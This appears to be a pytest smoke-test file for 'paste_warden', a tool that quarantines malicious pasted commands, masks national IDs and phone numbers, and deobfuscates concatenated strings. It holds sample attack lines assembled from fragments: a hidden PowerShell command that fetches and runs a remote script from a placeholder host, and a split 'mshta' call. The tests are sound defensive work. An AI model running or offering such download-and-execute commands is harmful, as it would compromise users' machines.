"""Smoke test of the `paste_warden` module (docs/plan/phase-2.md §2.7).

Runs under pytest or directly (`python tests/test_smoke.py`). Malicious samples
are assembled from fragments; secrets are made-up checksum-valid numbers.
"""

import paste_warden

FAKE_ID = 'A123456789'


def clickfix() -> str:
    return ''.join(
        [
            'power',
            'shell -w hidden -c "i',
            'ex(i',
            "wr 'https://example.invalid/a.ps1')\"",
        ]
    )


def test_version() -> None:
    assert paste_warden.ENGINE_VERSION == paste_warden.__version__
    assert paste_warden.ENGINE_VERSION.count('.') == 2


def test_clickfix_is_quarantined() -> None:
    r = paste_warden.analyze(clickfix(), 'en')
    assert r['schema'] == 1
    assert r['action'] == 'quarantine'
    assert r['command']['level'] == 'malicious'
    assert r['command']['risk_score'] >= 60
    assert r['command']['hosts'] == ['example.invalid']
    assert all(x['id'].startswith('cmd-') for x in r['command']['reasons'])
    assert paste_warden.analyze('echo hello')['action'] == 'allow'


def test_secret_spans_are_utf16_and_masked() -> None:
    text = f'🔑 身分證 {FAKE_ID} ok'
    r = paste_warden.analyze(text)
    assert r['action'] == 'warn'
    [s] = r['secrets']
    assert s['kind'] == 'national_id'
    assert s['masked'] == 'A12****789'
    assert s['label'] == '身分證字號'
    # 🔑 is one Python char but two UTF-16 units.
    assert s['span_utf16'] == [text.index(FAKE_ID) + 1, 10]
    assert FAKE_ID not in repr(r)


def test_packs_and_locale() -> None:
    ssn = '078-05-1120'
    assert paste_warden.analyze(f'SSN {ssn}')['secrets'] == []
    r = paste_warden.analyze(f'SSN {ssn}', 'en', packs=['universal', 'us'])
    assert [s['kind'] for s in r['secrets']] == ['national_id']


def test_mask() -> None:
    text = f'ID {FAKE_ID}, tel 0912345678.'
    assert paste_warden.mask(text) == 'ID A12****789, tel 091****678.'


def test_deobfuscate() -> None:
    d = paste_warden.deobfuscate("'ms'+'hta' https://example.invalid/x", 'en')
    assert 'concat' in [s['kind'] for s in d['trace']]
    assert 'mshta' in d['output_preview']
    assert d['capped'] is False
    hidden = paste_warden.deobfuscate("'A1234'+'56789'")
    assert FAKE_ID not in hidden['output_preview']


if __name__ == '__main__':
    for name, fn in sorted(globals().items()):
        if name.startswith('test_') and callable(fn):
            fn()
            print('ok', name)
